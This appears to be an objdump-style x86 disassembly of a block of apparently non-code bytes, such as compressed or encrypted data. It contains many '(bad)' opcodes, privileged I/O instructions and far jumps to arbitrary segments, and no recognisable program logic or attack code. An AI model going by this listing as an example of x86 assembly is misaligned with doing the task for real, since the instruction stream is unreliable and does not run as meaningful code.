  43d9d3:	mov    ah,0x75
  43d9d5:	add    bh,BYTE PTR [eax]
  43d9d7:	jl     0x43da00
  43d9d9:	out    0x37,al
  43d9db:	out    dx,eax
  43d9dc:	inc    ecx
  43d9dd:	cmp    DWORD PTR [esi],ebx
  43d9df:	pop    es
  43d9e0:	mov    eax,ds:0xba3ff5f7
  43d9e5:	cmp    al,0x69
  43d9e7:	aam    0xc6
  43d9e9:	push   edx
  43d9ea:	pop    ss
  43d9eb:	adc    esp,DWORD PTR [edi+edx*2]
  43d9ee:	dec    esi
  43d9ef:	sbb    cl,BYTE PTR [edx+0x208cb4a7]
  43d9f5:	lds    ecx,FWORD PTR [ebp+0x24]
  43d9f8:	inc    ecx
  43d9f9:	jecxz  0x43da3f
  43d9fb:	ret    0x52f3
  43d9fe:	jmp    0xca2a:0x1c4721e2
  43da05:	and    cl,0xe6
  43da08:	jae    0x43d9ac
  43da0a:	pop    ss
  43da0b:	ins    DWORD PTR es:[edi],dx
  43da0c:	mov    edi,ecx
  43da0e:	dec    ecx
  43da0f:	popa   
  43da10:	fldenv [esi+0x363d693]
  43da16:	les    edi,FWORD PTR [eax+ecx*2+0x7350f1c0]
  43da1d:	inc    ebp
  43da1e:	pop    ds
  43da1f:	(bad)  
  43da20:	(bad)  
  43da22:	xchg   edx,eax
  43da23:	inc    esp
  43da24:	adc    al,0x6b
  43da26:	and    dl,bh
  43da28:	cld    
  43da29:	fcmovne st,st(2)
  43da2b:	sbb    BYTE PTR ds:0x96b63116,0x51
  43da32:	jbe    0x43da8d
  43da34:	lea    ebx,[ebx+ebp*8+0x33710a2d]
  43da3b:	ins    DWORD PTR es:[edi],dx
  43da3c:	cmp    BYTE PTR [ecx-0x40],al
  43da3f:	aam    0x46
  43da41:	std    
  43da42:	call   0xee8fd8e9
  43da47:	mov    al,0x87
  43da49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43da4a:	add    DWORD PTR [edx+0x637f02f1],ecx
  43da50:	inc    esi
  43da51:	fisubr WORD PTR [edx+0x545bb79e]
  43da57:	aad    0x7e
  43da59:	retf   
  43da5a:	test   al,0xdd
  43da5c:	dec    edi
  43da5d:	retf   0x531f
  43da60:	shl    DWORD PTR [esi+0x79],cl
  43da63:	call   0x260a:0x464795c5
  43da6a:	push   ds
  43da6b:	lahf   
  43da6c:	das    
  43da6d:	jge    0x43da3a
  43da6f:	add    DWORD PTR [ecx-0x4186e055],ebx
  43da75:	jne    0x43da8b
  43da77:	imul   esp,DWORD PTR [eax+eax*1-0x6be62900],0xffffffa4
  43da7f:	fimul  DWORD PTR [esi+0x77]
  43da82:	outs   dx,BYTE PTR ds:[esi]
  43da83:	clc    
  43da84:	mov    DWORD PTR [edi],eax
  43da86:	retf   0x3a97
  43da89:	xchg   BYTE PTR [esi],bh
  43da8b:	adc    al,0x99
  43da8d:	aas    
  43da8e:	pop    edx
  43da8f:	add    eax,0x651f69af
  43da94:	add    al,0xd7
  43da96:	stos   DWORD PTR es:[edi],eax
  43da97:	add    BYTE PTR [ecx+0x3],0x40
  43da9b:	std    
  43da9c:	loop   0x43db04
  43da9e:	adc    al,0x9b
  43daa0:	pop    esp
  43daa1:	jnp    0x43dac2
  43daa3:	cmp    esp,DWORD PTR [ebx]
  43daa5:	pop    ecx
  43daa6:	jg     0x43dac1
  43daa8:	shr    bh,cl
  43daaa:	mov    dl,0xd6
  43daac:	sbb    DWORD PTR [edx],ebp
  43daae:	loopne 0x43db08
  43dab0:	jl     0x43db17
  43dab2:	push   ebp
  43dab3:	shl    DWORD PTR [edx+0x2],0x24
  43dab7:	xchg   ecx,eax
  43dab8:	inc    esi
  43dab9:	(bad)  
  43daba:	and    al,0xd7
  43dabc:	iret   
  43dabd:	mov    cl,0x5e
  43dabf:	mov    ebx,0x73eee00
  43dac4:	xchg   esp,eax
  43dac5:	ins    DWORD PTR es:[edi],dx
  43dac6:	or     al,0xe1
  43dac8:	aam    0xc5
  43daca:	pushf  
  43dacb:	pop    ebp
  43dacc:	dec    esi
  43dacd:	inc    ebx
  43dace:	mov    ds:0xfe61bad2,al
  43dad3:	mov    dh,BYTE PTR [esi-0x513d8041]
  43dad9:	pop    edx
  43dada:	pusha  
  43dadb:	outs   dx,DWORD PTR ds:[esi]
  43dadc:	push   ebp
  43dadd:	imul   edi,DWORD PTR [ecx+0x5fcf260b],0x1d
  43dae4:	adc    DWORD PTR [ebx],eax
  43dae6:	retf   0x29a9
  43dae9:	aas    
  43daea:	mov    ebx,0xf6ca4bf
  43daef:	jmp    0xb955:0xebbe0989
  43daf6:	jle    0x43dad3
  43daf8:	mov    ds:0xfe5ac61c,al
  43dafd:	out    dx,al
  43dafe:	outs   dx,BYTE PTR ds:[esi]
  43daff:	cmp    DWORD PTR gs:[ecx+0x3b88d5a4],esp
  43db06:	inc    esp
  43db07:	sub    BYTE PTR [edx+0x65],cl
  43db0a:	or     dl,BYTE PTR [ebx-0x66]
  43db0d:	dec    ebp
  43db0e:	push   cs
  43db0f:	push   ecx
  43db10:	adc    al,BYTE PTR [ebx]
  43db12:	stos   DWORD PTR es:[edi],eax
  43db13:	call   0x14fbf15b
  43db18:	jns    0x43db0f
  43db1a:	inc    esp
  43db1b:	scas   eax,DWORD PTR es:[edi]
  43db1c:	xchg   ebx,eax
  43db1d:	shl    BYTE PTR [eax+0xb],0x16
  43db21:	jb     0x43db2a
  43db23:	jb     0x43dad1
  43db25:	pop    ds
  43db26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43db27:	mov    bh,BYTE PTR [ebx]
  43db29:	repz mov ds:0x64d31994,al
  43db2f:	xchg   DWORD PTR [ecx+0x61d58119],ecx
  43db35:	mov    ebp,0x240c54cf
  43db3a:	(bad)  
  43db3b:	cli    
  43db3c:	xor    cl,BYTE PTR [ebx]
  43db3e:	mov    al,ds:0xeef164d8
  43db43:	pop    edx
  43db44:	ins    BYTE PTR es:[edi],dx
  43db45:	mov    al,ds:0x8d4c2976
  43db4a:	fistp  QWORD PTR [ecx-0x2a915004]
  43db50:	mov    eax,ds:0x87d7c479
  43db55:	add    ch,BYTE PTR [esi+0xa60f78d]
  43db5b:	xor    BYTE PTR [eax-0x2],0x1f
  43db5f:	or     esi,esp
  43db61:	and    edi,DWORD PTR [edi+0x4a]
  43db64:	pop    esp
  43db65:	inc    edi
  43db66:	icebp  
  43db67:	aam    0x59
  43db69:	jnp    0x43daef
  43db6b:	jo     0x43dbe9
  43db6d:	adc    BYTE PTR [ebp-0x2f],dh
  43db70:	mov    BYTE PTR ds:0x1d6f5b29,cl
  43db76:	scas   al,BYTE PTR es:[edi]
  43db77:	mov    ecx,0x12860266
  43db7c:	daa    
  43db7d:	cdq    
  43db7e:	xor    ah,BYTE PTR [esi+0x79]
  43db81:	pop    edx
  43db82:	pop    ds
  43db83:	or     eax,0x9d9a73fd
  43db88:	mov    dl,0xb2
  43db8a:	sbb    dl,bl
  43db8c:	and    bl,ch
  43db8e:	jno    0x43db65
  43db90:	pop    ebp
  43db91:	imul   ebp,DWORD PTR [ecx+edx*8+0x72],0x5f
  43db96:	xchg   edi,eax
  43db97:	xchg   edi,eax
  43db98:	mov    DWORD PTR [edi],esp
  43db9a:	ins    BYTE PTR es:[edi],dx
  43db9b:	int3   
  43db9c:	hlt    
  43db9d:	jnp    0x43db4a
  43db9f:	mov    cl,0x9a
  43dba1:	add    eax,0x60ec4ab8
  43dba6:	ret    
  43dba7:	pop    ds
  43dba8:	xchg   BYTE PTR [ebp-0xa],dh
  43dbab:	sbb    DWORD PTR [esi+0x2e2dc602],edi
  43dbb1:	(bad)  
  43dbb2:	xchg   ecx,eax
  43dbb3:	push   edi
  43dbb4:	lods   eax,DWORD PTR ds:[esi]
  43dbb5:	pop    ds
  43dbb6:	mov    esi,0xec87de37
  43dbbb:	jne    0x43db7c
  43dbbd:	jp     0x43dbbd
  43dbbf:	sbb    cl,BYTE PTR [esi-0x1080e0fe]
  43dbc5:	sbb    eax,DWORD PTR [eax-0x26]
  43dbc8:	jne    0x43dbe9
  43dbca:	pop    ecx
  43dbcb:	fsubr  DWORD PTR [esi+0x3]
  43dbce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43dbcf:	fsub   DWORD PTR es:[ecx-0x47f21162]
  43dbd6:	arpl   WORD PTR [edi-0x44],bx
  43dbd9:	pop    ebx
  43dbda:	mov    eax,ds:0x90830d95
  43dbdf:	in     al,0xdf
  43dbe1:	add    eax,0xf18ce1dc
  43dbe6:	retf   0xef3c
  43dbe9:	repnz and ah,cl
  43dbec:	adc    eax,DWORD PTR [eax+0x3dd902d]
  43dbf2:	dec    edx
  43dbf3:	pop    edi
  43dbf4:	ss adc dh,dh
  43dbf7:	adc    ebp,ecx
  43dbf9:	out    dx,eax
  43dbfa:	push   eax
  43dbfb:	lods   al,BYTE PTR ds:[esi]
  43dbfc:	xchg   ebp,eax
  43dbfd:	cmp    ebx,DWORD PTR [edi]
  43dbff:	mov    eax,ds:0xdd47ce06
  43dc04:	outs   dx,BYTE PTR ds:[esi]
  43dc05:	out    0x27,eax
  43dc07:	aam    0x26
  43dc09:	inc    edx
  43dc0a:	adc    al,0x3d
  43dc0c:	fcomp  st(1)
  43dc0e:	sub    BYTE PTR [eax+0x43fb938c],0xcc
  43dc15:	mov    bl,0xd1
  43dc17:	push   esp
  43dc18:	jb     0x43dbdc
  43dc1a:	das    
  43dc1b:	test   DWORD PTR [esp+ecx*4+0x31fdb521],ebp
  43dc22:	sbb    BYTE PTR [edi+0x3f],dl
  43dc25:	push   es
  43dc26:	adc    eax,0x1f35d0c3
  43dc2b:	adc    DWORD PTR [edx-0x70],esp
  43dc2e:	iret   
  43dc2f:	xchg   BYTE PTR [ecx+0x21],cl
  43dc32:	mov    ebp,0x1f9c7042
  43dc37:	ja     0x43dc27
  43dc39:	or     eax,0xf34e5746
  43dc3e:	lods   al,BYTE PTR ds:[esi]
  43dc3f:	push   ebx
  43dc40:	push   esi
  43dc41:	adc    BYTE PTR [ebx+ebx*4-0x18],al
  43dc45:	push   edx
  43dc46:	retf   0x10d5
  43dc49:	push   0xfc8e2233
  43dc4e:	(bad)  
  43dc50:	mov    BYTE PTR [ebx],dl
  43dc52:	dec    ebx
  43dc53:	and    eax,0x4d3b7d
  43dc58:	lods   eax,DWORD PTR ds:[esi]
  43dc59:	add    dh,dl
  43dc5b:	jne    0x43dc84
  43dc5d:	mov    es,WORD PTR [ecx-0x63d244b5]
  43dc63:	xchg   ebx,eax
  43dc64:	adc    BYTE PTR [ecx+ebp*1],dl
  43dc67:	ins    BYTE PTR es:[edi],dx
  43dc68:	add    bl,dh
  43dc6a:	test   DWORD PTR [ebp-0x23e74f7c],eax
  43dc70:	dec    eax
  43dc71:	arpl   WORD PTR [ecx],di
  43dc73:	lods   eax,DWORD PTR ds:[esi]
  43dc74:	sbb    eax,0xdce36498
  43dc79:	push   edi
  43dc7a:	dec    esi
  43dc7b:	sub    BYTE PTR [ebp+0x6a],dh
  43dc7e:	push   ds
  43dc7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43dc80:	adc    al,BYTE PTR [edx-0x20]
  43dc83:	xor    esp,DWORD PTR [edx]
  43dc85:	sbb    esi,DWORD PTR [edx-0x2c]
  43dc88:	sahf   
  43dc89:	(bad)  
  43dc8a:	sbb    bl,BYTE PTR [eax+0x3cd4f8be]
  43dc90:	mov    bh,0x4d
  43dc92:	xchg   esp,eax
  43dc93:	call   0xb7c6:0x8b659dd5
  43dc9a:	in     eax,0x65
  43dc9c:	jmp    0x1a00:0x53e800bc
  43dca3:	mov    ecx,0x336f72e7
  43dca8:	add    bl,dl
  43dcaa:	ds xchg esp,eax
  43dcac:	mov    BYTE PTR [ecx-0x45773cc0],dl
  43dcb2:	pop    ebp
  43dcb3:	test   ebp,esi
  43dcb5:	add    cl,BYTE PTR [ebx+eax*1]
  43dcb8:	lahf   
  43dcb9:	frstor [edx+ebx*2]
  43dcbc:	leave  
  43dcbd:	push   ds
  43dcbe:	push   ds
  43dcbf:	push   ebp
  43dcc0:	cmp    ebp,DWORD PTR [ebp+0x67]
  43dcc3:	jae    0x43dc87
  43dcc5:	outs   dx,BYTE PTR ds:[esi]
  43dcc6:	sti    
  43dcc7:	aam    0x4
  43dcc9:	pushf  
  43dcca:	inc    edi
  43dccb:	in     eax,dx
  43dccc:	iret   
  43dccd:	adc    eax,0xf17d8fcb
  43dcd2:	pusha  
  43dcd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43dcd4:	sbb    eax,0x5f9a3fef
  43dcd9:	les    ebx,FWORD PTR [ecx-0x5bfa4e3d]
  43dcdf:	rcr    esi,1
  43dce1:	loopne 0x43dc71
  43dce3:	ja     0x43dd46
  43dce5:	mov    ah,BYTE PTR [eax-0xd]
  43dce8:	sbb    bh,BYTE PTR [edx-0x26]
  43dceb:	mov    al,ah
  43dced:	dec    esp
  43dcee:	and    edi,edx
  43dcf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43dcf1:	and    eax,0x9c8aadac
  43dcf6:	xor    edi,ecx
  43dcf8:	xchg   edi,eax
  43dcf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43dcfa:	into   
  43dcfb:	push   esi
  43dcfc:	int    0x42
  43dcfe:	call   0x6edabb67
  43dd03:	call   0x9b2fdf69
  43dd08:	push   ebx
  43dd09:	std    
  43dd0a:	sbb    BYTE PTR [edx-0x62e1bee5],bh
  43dd10:	sbb    BYTE PTR [esi],ah
  43dd12:	or     BYTE PTR [edi+0x69],dh
  43dd15:	mov    dh,0xa6
  43dd17:	into   
  43dd18:	push   ss
  43dd19:	add    bl,BYTE PTR [eax-0x2a20aaff]
  43dd1f:	rcl    DWORD PTR [edx+0x5bb7660b],1
  43dd25:	(bad)  
  43dd26:	mov    esp,0xa2f2f170
  43dd2b:	mov    bh,cl
  43dd2d:	add    eax,0x5a58b76e
  43dd32:	ja     0x43dd5f
  43dd34:	sbb    BYTE PTR [ecx],0x1f
  43dd37:	pop    ss
  43dd38:	dec    ebx
  43dd39:	jl     0x43dcd2
  43dd3b:	fcomp  QWORD PTR [edx+ebx*1]
  43dd3e:	add    ah,dl
  43dd40:	imul   ebx,DWORD PTR [esi-0x52],0xd98ef20c
  43dd47:	pop    eax
  43dd48:	(bad)
  43dd4c:	hlt    
  43dd4d:	or     eax,0x1e084475
  43dd52:	test   bh,dl
  43dd54:	stc    
  43dd55:	fild   WORD PTR [eax+0x2894862e]
  43dd5b:	iret   
  43dd5c:	loopne 0x43ddc5
  43dd5e:	ficomp WORD PTR [eax]
  43dd60:	mov    DWORD PTR [ebx],esp
  43dd62:	cmp    eax,0xe88a4314
  43dd67:	and    BYTE PTR [esi],bh
  43dd69:	scas   eax,DWORD PTR es:[edi]
  43dd6a:	sbb    ebx,esp
  43dd6c:	sub    BYTE PTR [ebx],al
  43dd6e:	cwde   
  43dd6f:	loope  0x43dd28
  43dd71:	imul   esp,esp,0x67
  43dd74:	outs   dx,DWORD PTR ds:[esi]
  43dd75:	pop    ds
  43dd76:	pusha  
  43dd77:	imul   ecx,DWORD PTR gs:[ebp+0x1d],0x651c0afb
  43dd7f:	or     al,0xa3
  43dd81:	mov    ds:0x6d72bb7d,al
  43dd86:	rcl    ebp,0x3d
  43dd89:	add    eax,0x272940a7
  43dd8e:	xor    al,0x84
  43dd90:	sbb    al,0x4d
  43dd92:	push   ds
  43dd93:	pop    ecx
  43dd94:	test   al,0x33
  43dd96:	cmp    cl,BYTE PTR [edx]
  43dd98:	mov    BYTE PTR [ecx+0x45],dh
  43dd9b:	fild   QWORD PTR [edi]
  43dd9d:	retf   
  43dd9e:	push   ecx
  43dd9f:	jbe    0x43dd53
  43dda1:	mov    cl,BYTE PTR [ecx+0x5]
  43dda4:	xchg   edi,eax
  43dda5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43dda6:	mov    dl,0x7d
  43dda8:	dec    ecx
  43dda9:	hlt    
  43ddaa:	rcl    DWORD PTR [edx-0x7a],1
  43ddad:	into   
  43ddae:	pusha  
  43ddaf:	retf   
  43ddb0:	iret   
  43ddb1:	push   ecx
  43ddb2:	test   DWORD PTR [ebp-0x46],esi
  43ddb5:	aam    0x62
  43ddb7:	popf   
  43ddb8:	sub    eax,0x88c1dee2
  43ddbd:	xchg   edx,eax
  43ddbe:	imul   BYTE PTR [edi]
  43ddc0:	adc    BYTE PTR [ebx-0x5a701f56],al
  43ddc6:	cmp    cl,cl
  43ddc8:	jo     0x43dd57
  43ddca:	ret    0x259e
  43ddcd:	push   eax
  43ddce:	mov    edi,0x1ffdbea2
  43ddd3:	push   ebp
  43ddd4:	mov    ds:0x886429a0,eax
  43ddd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ddda:	mov    esi,0x7b476bcc
  43dddf:	sub    edx,DWORD PTR [edx+0x0]
  43dde2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43dde3:	cmc    
  43dde4:	xor    al,0x9f
  43dde6:	jg     0x43dd8c
  43dde8:	(bad)  
  43dde9:	retf   
  43ddea:	sahf   
  43ddeb:	xor    BYTE PTR [eax-0x7608b32d],0x9d
  43ddf2:	xchg   esp,eax
  43ddf3:	xlat   BYTE PTR ds:[ebx]
  43ddf4:	jb     0x43de30
  43ddf6:	rcl    bl,1
  43ddf8:	(bad)  
  43ddf9:	xor    al,0x65
  43ddfb:	test   al,0xbb
  43ddfd:	mov    edx,0x61297486
  43de02:	push   ss
  43de03:	fisttp WORD PTR [eax-0x19a30863]
  43de09:	mov    cl,0xe5
  43de0b:	adc    al,0x63
  43de0d:	inc    esi
  43de0e:	adc    al,0x56
  43de10:	inc    DWORD PTR [edx-0x636295d]
  43de16:	add    eax,0xecbd8a28
  43de1b:	bound  esi,QWORD PTR [edx+0x32]
  43de1e:	xor    DWORD PTR [ebx+0x70],esi
  43de21:	sbb    ecx,0xffffffd5
  43de24:	(bad)  
  43de25:	(bad)  
  43de26:	mov    al,0xb0
  43de28:	sbb    BYTE PTR [edx+eiz*1+0x1158800],0x57
  43de30:	jle    0x43de36
  43de32:	adc    BYTE PTR [esi+0x135e735b],0xfa
  43de39:	(bad)  
  43de3a:	pop    ds
  43de3b:	cmp    al,0x96
  43de3d:	shl    DWORD PTR [edx],1
  43de3f:	sahf   
  43de40:	cmp    BYTE PTR [eax+0x1871d91f],cl
  43de46:	mov    edx,0xb09204c6
  43de4b:	aad    0x7d
  43de4d:	sbb    al,0xf9
  43de4f:	jle    0x43de47
  43de51:	sahf   
  43de52:	mov    al,cs:0x3f186388
  43de58:	fild   QWORD PTR [edi]
  43de5a:	and    di,bp
  43de5d:	add    eax,0x9b674596
  43de62:	mov    bl,0xd9
  43de64:	outs   dx,BYTE PTR ds:[esi]
  43de65:	or     eax,0x22b70360
  43de6a:	push   edi
  43de6b:	push   ss
  43de6c:	or     edx,DWORD PTR [esi+ecx*8+0x7c9eab45]
  43de73:	(bad)  
  43de74:	call   0xf7cb:0x34f15e6d
  43de7b:	cs (bad) 
  43de7d:	aad    0xaa
  43de7f:	aas    
  43de80:	jns    0x43de11
  43de82:	mov    ch,0x95
  43de84:	cli    
  43de85:	mov    esp,0xa3189b91
  43de8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43de8b:	push   ebx
  43de8c:	clc    
  43de8d:	int    0x5e
  43de8f:	sub    ch,BYTE PTR [eax]
  43de91:	out    dx,eax
  43de92:	jnp    0x43de89
  43de94:	js     0x43dedd
  43de96:	pop    ebx
  43de97:	(bad)  
  43de99:	mov    BYTE PTR [edx+0x2c],ah
  43de9c:	in     al,0xd8
  43de9e:	and    al,0x35
  43dea0:	pusha  
  43dea1:	mov    ebp,0xacefd41e
  43dea6:	rol    DWORD PTR ds:0x34ad92ca,cl
  43deac:	sbb    BYTE PTR [eax],dl
  43deae:	(bad)  
  43deb0:	test   eax,0x6c368a21
  43deb5:	mov    ch,0xe0
  43deb7:	aam    0x32
  43deb9:	push   esi
  43deba:	push   esp
  43debb:	outs   dx,DWORD PTR fs:[esi]
  43debd:	(bad)  
  43debe:	or     eax,DWORD PTR [esi+0x76d72788]
  43dec4:	jbe    0x43de46
  43dec6:	(bad)  
  43dec7:	clc    
  43dec8:	pop    DWORD PTR ds:0x9df2e50e
  43dece:	mov    esp,0x6ea548ff
  43ded3:	and    DWORD PTR [ebx],0x4e7ee496
  43ded9:	sub    BYTE PTR [esi],ch
  43dedb:	(bad)  
  43dedc:	fnstsw WORD PTR [ebx+0xf]
  43dedf:	add    al,0x1a
  43dee1:	call   0xbd56:0x307fd4e
  43dee8:	std    
  43dee9:	dec    ecx
  43deea:	dec    ebp
  43deeb:	in     eax,0x59
  43deed:	inc    ebp
  43deee:	adc    BYTE PTR [edx],ah
  43def0:	mov    DWORD PTR ds:0xb02a0c60,edi
  43def6:	adc    al,BYTE PTR [ebx]
  43def8:	sbb    eax,DWORD PTR [ebx]
  43defa:	push   0xffffff8d
  43defc:	in     al,0xa7
  43defe:	mov    dl,0x25
  43df00:	int3   
  43df01:	xor    eax,0x6fd5a11f
  43df06:	int    0xd
  43df08:	adc    esi,esp
  43df0a:	jp     0x43ded1
  43df0c:	mov    ebx,0x6e4eaa05
  43df11:	push   cs
  43df12:	sbb    bl,dl
  43df14:	dec    ebp
  43df15:	mov    ebp,0xb38a82bf
  43df1a:	dec    eax
  43df1b:	adc    eax,0x42303bea
  43df20:	xor    bl,al
  43df22:	sub    ebp,DWORD PTR [edx-0x67b0ef0]
  43df28:	xor    edx,esp
  43df2a:	pop    es
  43df2b:	sbb    DWORD PTR [ecx],edi
  43df2d:	in     al,dx
  43df2e:	mov    ebx,0x5cfd82e5
  43df33:	and    DWORD PTR [eax],ecx
  43df35:	push   esp
  43df36:	int    0x46
  43df38:	xchg   edi,eax
  43df39:	sub    edx,DWORD PTR [ecx+0x24]
  43df3c:	push   eax
  43df3d:	and    ebx,DWORD PTR [esi]
  43df3f:	icebp  
  43df40:	push   ebx
  43df41:	dec    ebx
  43df42:	mul    BYTE PTR [esi+0x5360e687]
  43df48:	mov    ecx,0xe0888dc3
  43df4d:	fild   QWORD PTR [edx+0x19ed64d4]
  43df53:	jmp    0x43df50
  43df55:	inc    ebx
  43df56:	ins    BYTE PTR es:[edi],dx
  43df57:	shl    BYTE PTR [eax-0x6e],cl
  43df5a:	pusha  
  43df5b:	fwait
  43df5c:	xlat   BYTE PTR ds:[ebx]
  43df5d:	sbb    ebp,DWORD PTR [eax+0x30aa9469]
  43df63:	xlat   BYTE PTR ds:[ebx]
  43df64:	sbb    eax,0x55a29401
  43df69:	add    DWORD PTR [eax-0x1b],0x30bf1588
  43df70:	inc    edx
  43df71:	xor    DWORD PTR [ebx+0x3c],0xb82a1d28
  43df78:	xchg   edi,eax
  43df79:	mov    dl,0x99
  43df7b:	cld    
  43df7c:	test   eax,0x6ab99166
  43df81:	adc    bl,BYTE PTR [esi]
  43df83:	dec    edi
  43df85:	retf   0x9f5c
  43df88:	aam    0x47
  43df8a:	enter  0x9ed2,0xf1
  43df8e:	ja     0x43dff5
  43df90:	adc    al,0x2d
  43df92:	pop    ds
  43df93:	cmp    bh,BYTE PTR [esp]
  43df96:	push   ds
  43df97:	pop    ecx
  43df98:	das    
  43df99:	and    DWORD PTR [ebx-0x44b5c111],eax
  43df9f:	xlat   BYTE PTR ds:[ebx]
  43dfa0:	das    
  43dfa1:	ins    BYTE PTR es:[edi],dx
  43dfa2:	xchg   ebp,eax
  43dfa3:	xchg   ebx,eax
  43dfa4:	daa    
  43dfa5:	(bad)  
  43dfa7:	je     0x43df82
  43dfa9:	bound  ebx,QWORD PTR [edi]
  43dfab:	gs dec eax
  43dfad:	jg     0x43df8b
  43dfaf:	les    ebx,FWORD PTR [ecx+0x76]
  43dfb2:	ficomp WORD PTR ds:[esi-0x5b]
  43dfb6:	mov    ebx,0x66bca274
  43dfbb:	xchg   edi,eax
  43dfbc:	jne    0x43dfb8
  43dfbe:	pop    esi
  43dfbf:	fst    st(2)
  43dfc1:	mov    ch,0x34
  43dfc3:	cli    
  43dfc4:	test   DWORD PTR [ebx],0xed28daa8
  43dfca:	mov    bh,BYTE PTR [ebx-0x36]
  43dfcd:	call   0xed36:0x56b92fc2
  43dfd4:	mov    BYTE PTR [ecx-0x7e],bh
  43dfd7:	mov    cl,BYTE PTR [ecx+0x48]
  43dfda:	pusha  
  43dfdb:	xchg   esp,eax
  43dfdc:	and    ah,bh
  43dfde:	and    al,0xd4
  43dfe0:	xchg   edi,eax
  43dfe1:	xchg   DWORD PTR fs:[eax-0x357647f2],ebx
  43dfe8:	mov    BYTE PTR [ecx-0x433dfb61],dl
  43dfee:	adc    DWORD PTR [ebx-0x6e],ecx
  43dff1:	add    bh,BYTE PTR [ecx+ecx*8]
  43dff4:	or     eax,0x7f1fad48
  43dff9:	sar    DWORD PTR [ebp-0x7],0x7d
  43dffd:	cmp    al,0x8e
  43dfff:	push   esp
  43e000:	mov    eax,DWORD PTR [eax-0x4a]
  43e003:	(bad)
  43e007:	fbstp  TBYTE PTR [edi+0x2]
  43e00a:	adc    BYTE PTR [ebx-0x407920fa],dh
  43e010:	ret    0x1e56
  43e013:	add    DWORD PTR [ecx+0xe513ba5],edi
  43e019:	cmp    eax,0x801ad45e
  43e01e:	xor    BYTE PTR [eax+0x3a],ch
  43e021:	pusha  
  43e022:	jmp    0x43e09d
  43e024:	mov    dl,BYTE PTR [ebx+0x1d]
  43e027:	repnz imul eax,DWORD PTR [ecx+0x20],0x647b28de
  43e02f:	sar    BYTE PTR [edx+0x4f],cl
  43e032:	mov    ah,0xa2
  43e034:	mov    ah,0x2a
  43e036:	sahf   
  43e037:	or     dh,0x50
  43e03a:	push   0x8af6c975
  43e03f:	mov    al,0x8b
  43e041:	mov    WORD PTR [ebp+0x3a],es
  43e044:	cmp    DWORD PTR [ebx-0xaebb81e],edx
  43e04a:	bound  ebx,QWORD PTR [ecx]
  43e04c:	imul   BYTE PTR [ebx-0x5a1f7bd7]
  43e052:	mov    al,0x17
  43e054:	test   BYTE PTR [ecx+0x5d6cb9ee],cl
  43e05a:	sub    dl,ah
  43e05c:	push   esp
  43e05d:	aad    0x91
  43e05f:	dec    edi
  43e060:	inc    esi
  43e061:	mov    ecx,DWORD PTR [eax+0x69f58745]
  43e067:	sbb    eax,0x22df2504
  43e06c:	mov    al,ds:0x48d46086
  43e071:	scas   al,BYTE PTR es:[edi]
  43e072:	inc    esi
  43e073:	inc    edx
  43e074:	xchg   DWORD PTR [edi+esi*8+0x1ff07db7],edi
  43e07b:	lds    eax,FWORD PTR [edi+0x2d]
  43e07e:	mov    al,ds:0x59bec152
  43e083:	ret    0xca48
  43e086:	adc    DWORD PTR [ebx],eax
  43e088:	mov    cl,0x39
  43e08a:	loopne 0x43e0c4
  43e08c:	sbb    ecx,0xffffffe0
  43e08f:	add    ecx,DWORD PTR [edi+0x1d]
  43e092:	lock ins BYTE PTR es:[edi],dx
  43e094:	mov    edi,ebx
  43e096:	xor    al,0xd3
  43e098:	imul   ecx,ebp,0x74
  43e09b:	imul   ecx,DWORD PTR [eax],0xffffff9b
  43e09e:	push   ebp
  43e09f:	aad    0xb
  43e0a1:	sub    BYTE PTR [ebp+0x35],ch
  43e0a4:	and    bl,BYTE PTR [edx-0x7e]
  43e0a7:	pop    edx
  43e0a8:	mov    eax,DWORD PTR [ebp-0x59787c9b]
  43e0ae:	inc    ecx
  43e0af:	mov    ecx,0xd5b80d40
  43e0b4:	(bad)  
  43e0b6:	rcr    DWORD PTR [eax],cl
  43e0b8:	(bad)  
  43e0b9:	jge    0x43e0d5
  43e0bb:	mov    esi,0x3e306bb2
  43e0c0:	mov    ebx,ebp
  43e0c2:	mov    BYTE PTR [ecx],0xb2
  43e0c5:	push   0xffffffe0
  43e0c7:	aad    0x90
  43e0c9:	push   ecx
  43e0ca:	call   0x850ae66c
  43e0cf:	jb     0x43e059
  43e0d1:	fld    DWORD PTR [eiz*4+0x46621d9b]
  43e0d8:	lock and al,0xac
  43e0db:	inc    esi
  43e0dc:	push   ss
  43e0dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e0de:	loop   0x43e078
  43e0e0:	mov    esp,0x66e85637
  43e0e5:	ret    0x642d
  43e0e8:	xchg   edi,eax
  43e0e9:	add    ch,BYTE PTR [esi]
  43e0eb:	rep stos DWORD PTR es:[edi],eax
  43e0ed:	mov    DWORD PTR [esi+0x35],ebx
  43e0f0:	sub    ebp,DWORD PTR [ebx]
  43e0f2:	pop    ds
  43e0f3:	leave  
  43e0f4:	daa    
  43e0f5:	lods   eax,DWORD PTR ds:[esi]
  43e0f6:	pusha  
  43e0f7:	lods   al,BYTE PTR ds:[esi]
  43e0f8:	add    al,0x7c
  43e0fa:	aaa    
  43e0fb:	stos   BYTE PTR es:[edi],al
  43e0fc:	jb     0x43e157
  43e0fe:	cmp    BYTE PTR [edx],bh
  43e100:	and    BYTE PTR [esp+ebx*1+0x40],bl
  43e104:	dec    ecx
  43e105:	cmp    esp,DWORD PTR [eax]
  43e107:	sub    edi,esi
  43e109:	imul   edi,eax,0xffffffc6
  43e10c:	mov    BYTE PTR ds:0x9e86ac05,cl
  43e112:	mov    ?,WORD PTR [edx-0x4a]
  43e115:	add    eax,0xb237b2aa
  43e11a:	sar    edi,0x1d
  43e11d:	jp     0x43e13d
  43e11f:	mov    bh,0x87
  43e121:	fwait
  43e122:	ins    BYTE PTR es:[edi],dx
  43e123:	fidiv  WORD PTR [eax]
  43e125:	and    ebx,ecx
  43e127:	aad    0xce
  43e129:	cmc    
